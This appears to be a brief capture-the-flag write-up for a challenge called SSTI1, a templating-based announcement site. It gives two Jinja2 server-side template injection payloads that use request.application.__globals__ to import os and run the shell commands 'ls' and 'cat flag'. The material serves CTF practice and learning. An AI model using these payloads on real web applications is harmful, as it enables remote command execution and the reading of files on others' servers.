## SSTI1

### Description  

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps!


---





{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}